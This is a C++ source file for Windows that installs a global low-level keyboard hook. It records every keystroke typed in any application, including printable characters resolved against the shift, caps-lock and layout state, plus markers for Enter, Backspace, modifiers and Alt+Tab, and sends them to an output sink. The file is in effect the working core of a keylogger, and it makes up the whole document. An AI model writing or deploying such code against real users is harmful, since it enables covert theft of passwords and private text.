#include "user_input_event_source.h"

#include <cassert>
#include <spdlog/spdlog.h>
#include <string>

#include "event_sink.h"

bool leftAltPressed = false;
bool tabPressed = false;

/** Static variable initialization */
HHOOK UserInputEventSource::hKeyboardHook = NULL;
EventSink *UserInputEventSource::outputSink = nullptr;

void UserInputEventSource::initializeSource(EventSink *inSink)
{
    outputSink = inSink;
    if (outputSink == nullptr)
    {
        throw std::runtime_error(RP_ERR_INITIALIZED_WITH_NULLPTR_EVENT_SINK);
    }

    // We need to get a handle to the module (a loaded .dll or .exe) that contains
    // the hook procedure code Since the hook proc code will exist in the same
    // binary file, we set the module name to null here which returns a handle to
    // the file used to create the calling process (calling process is our app)
    HMODULE hMod = GetModuleHandle(NULL);

    // Install the hook
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hMod, 0);

    if (!hKeyboardHook)
    {
        throw std::runtime_error("Failed to register keyboard hook: " + std::to_string(GetLastError()));
    }

    spdlog::info("UserInputEventSource successfully installed keyboard hook");
}

void UserInputEventSource::uninitializeSource()
{
    assert(hKeyboardHook != NULL);

    UnhookWindowsHookEx(hKeyboardHook);
    hKeyboardHook = NULL;
    spdlog::info("UserInputEventSource successfully uninstalled keyboard hook");
}

bool handleSpecialkey(int vkCode, EventSink *outputSink)
{
    switch (vkCode)
    {
    case VK_RETURN:
        *outputSink << "[ENTER]";
        break;
    case VK_BACK:
        *outputSink << "[BACKSPACE]";
        break;
    case VK_LCONTROL:
        *outputSink << "[LCTRL]";
        break;
    case VK_LSHIFT:
        *outputSink << "[LSHIFT]";
        break;
    case VK_RSHIFT:
        *outputSink << "[RSHIFT]";
        break;
    case VK_SPACE:
        *outputSink << "[SPACE]";
        break;
    case VK_CAPITAL:
        *outputSink << "[CAPSLOCK]";
        break;
    default:
        return false;
    }
    return true;
}

LRESULT CALLBACK UserInputEventSource::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        // lParam is a pointer to a KBDLLHOOKSTRUCT
        KBDLLHOOKSTRUCT *pKeyboard = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

        // Handle keyup down events
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Check for ALT+TAB combo
            if (pKeyboard->vkCode == VK_LMENU)
            {
                leftAltPressed = true;
            }
            else if (pKeyboard->vkCode == VK_TAB)
            {
                // If we press tab and alt isnt pressed, then TAB+ALT was entered, not
                // ALT+TAB, so we should just log out tab by itself and leave it as
                // false
                if (!leftAltPressed)
                {
                    *outputSink << "[TAB]";
                    tabPressed = false;
                }
                else
                {
                    tabPressed = true;
                }
            }

            // Handle ALT+TAB
            if (leftAltPressed && tabPressed)
            {
                *outputSink << "[ALT+TAB]";
            }
            // Handle special key or everything else
            else if (!handleSpecialkey(pKeyboard->vkCode, outputSink))
            {
                // If we get here and alt is pressed, that means that left alt was/is
                // pressed, and the key that followed it was not TAB, so we'll just
                // treat it as another combination (this is scuffed)
                if (leftAltPressed)
                {
                    *outputSink << "[ALT]";
                }

                wchar_t unicodeBuffer[2] = {0};
                static BYTE keyboardState[256] = {0};
                GetKeyboardState(keyboardState);

                // Check if shift key is currently pressed
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
                {
                    keyboardState[VK_SHIFT] |= 0x80;
                }
                // Check if caps lock is on (low order bit indicates whether or not key
                // is toggled)
                if (GetKeyState(VK_CAPITAL) & 0x0001)
                {
                    keyboardState[VK_CAPITAL] |= 0x01;
                }

                // Check if the key is a "typable" character
                if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x39) || // Numbers
                    (pKeyboard->vkCode >= 0x41 && pKeyboard->vkCode <= 0x5A) || // Letters
                    (pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_3) ||
                    (pKeyboard->vkCode >= VK_OEM_4 && pKeyboard->vkCode <= VK_OEM_7))
                {
                    // Convert the input to unicode character (need to do this since the
                    // input can change based on kbd state and the keyboard layout)
                    int i = 0;
                    int len = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 2, 0);

                    // iswprint checks if this is printable ascii character.
                    // printing control characters (this is rlly bad code fix this soon)
                    while (i < len && iswprint(unicodeBuffer[i]))
                    {
                        i++;
                    }

                    // If all of the chars were printable, then send them to output sink
                    if (i == len)
                    {
                        *outputSink << unicodeBuffer;
                    }
                }
            }
        }
        else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
        {
            if (pKeyboard->vkCode == VK_LMENU)
            {
                leftAltPressed = false;
            }
            else if (pKeyboard->vkCode == VK_TAB)
            {
                tabPressed = false;
            }
        }
    }

    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}
